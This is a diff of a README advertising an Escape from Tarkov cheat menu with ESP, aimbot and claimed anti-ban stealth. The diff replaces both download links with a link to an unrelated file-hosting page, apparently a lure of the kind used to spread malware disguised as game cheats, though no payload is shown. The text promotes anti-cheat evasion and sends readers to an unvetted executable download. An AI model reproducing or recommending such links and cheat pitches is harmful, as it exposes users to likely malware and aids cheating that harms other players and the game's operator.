@@ -6,14 +6,14 @@
 
 Escape from Tarkov ain’t your average looter-shooter. It’s hardcore, sweaty, and punishing – one misstep and your gear’s gone for good. But with this cheat, YOU set the rules. Imagine walking into Labs knowing exactly where every player, AI, and loot stash is hiding. Whether you're soloing hardcore or rolling with a squad, this cheat gives you that cracked edge every raid.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload6.bitbucket.io)
 ---
 
 ## 🛠️ Product Description
 
 This Tarkov mod menu is packed with elite features made to fly under the radar. Designed for full stealth mode, it keeps you safe from bans while giving you complete control of the battlefield. Works across most builds, with frequent updates for stability and bypasses.
 
-[![Download Cheat](https://i.imgur.com/rC9HswY.png)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Cheat](https://i.imgur.com/rC9HswY.png)](https://fileoffload6.bitbucket.io)
 ---
 
 ## 🔥 Cheat Features Breakdown
@@ -86,3 +86,4 @@ Escape from Tarkov cheat, Tarkov ESP, Tarkov wallhack, EFT aimbot, Tarkov undete
 ---
 
 Wanna run Labs like a god? Slide this cheat into your loadout and stop playing Tarkov on nightmare mode. 🎯💰
+
